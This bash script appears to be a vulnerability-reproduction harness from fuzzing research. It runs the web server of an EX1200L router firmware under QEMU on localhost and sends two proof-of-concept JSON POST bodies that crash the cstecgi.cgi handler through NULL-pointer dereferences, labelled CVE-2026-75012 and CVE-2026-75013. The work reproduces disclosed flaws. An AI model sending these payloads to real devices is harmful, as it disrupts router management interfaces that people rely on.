#!/bin/bash
# EX1200L cstecgi NULL derefs (CVE-2026-75012 setPasswordCfg / CVE-2026-75013 setWizardCfg)
T=/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz/tests/realworld/ex1200l_lighttpd
QEMU=/home/webfuzz/Documents/qemu-rrfuzz/build/qemu-mipsel
[ -f /tmp/ex1200l_cgi_test.conf ] || cp /tmp/ex1200l_cgi_test.conf /tmp/ 2>/dev/null || true
cat > /tmp/ex1200l_cgi_test.conf <<CONF
server.modules = ( "mod_access", "mod_cgi", "mod_indexfile" )
server.modules-dir = "/lighttp/lib"
server.port = 18081
server.bind = "127.0.0.1"
server.document-root = "/www"
server.pid-file = "/tmp/lighttpd_cgi_test.pid"
server.errorlog = "/dev/stderr"
server.upload-dirs = ("/tmp")
index-file.names = ("index.html")
cgi.assign = (".cgi" => "")
CONF
pkill -f "ex1200l.*lighttpd -f /tmp/ex1200l_cgi" 2>/dev/null; sleep 1
echo '$ starting EX1200L lighttpd+mod_cgi (port 18081), sending CVE PoC bodies'
setsid $QEMU -L "$T/sysroot" "$T/lighttpd" -f /tmp/ex1200l_cgi_test.conf -D &
sleep 4
python3 - <<'PY'
import socket, time, subprocess
def post(body):
    req=(f"POST /cgi-bin/cstecgi.cgi HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
         f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()+body
    try:
        s=socket.create_connection(("127.0.0.1",18081),timeout=5); s.sendall(req); s.settimeout(3)
        try: return s.recv(40)[:30]
        except Exception: return b"<reset>"
    except Exception as e: return f"ERR:{type(e).__name__}".encode()
def alive():
    try:
        s=socket.create_connection(("127.0.0.1",18081),timeout=2); s.close(); return True
    except Exception: return False
# CVE-2026-75012: setPasswordCfg without password field -> strcoll(valid, NULL)
print(f"baseline listener: {alive()}")
r1=post(b'{"topicurl":"setPasswordCfg"}')
print(f"[CVE-2026-75012] setPasswordCfg missing password -> HTTP: {r1!r} ; lighttpd parent alive: {alive()}")
# CVE-2026-75013: setWizardCfg without fields -> strcoll(NULL, NULL)
r2=post(b'{"topicurl":"setWizardCfg"}')
print(f"[CVE-2026-75013] setWizardCfg missing fields -> HTTP: {r2!r} ; lighttpd parent alive: {alive()}")
print("NOTE: handler (CGI child) crashes with SIGSEGV strcoll(NULL); parent survives by design")
PY
pkill -f "ex1200l.*lighttpd -f /tmp/ex1200l_cgi" 2>/dev/null
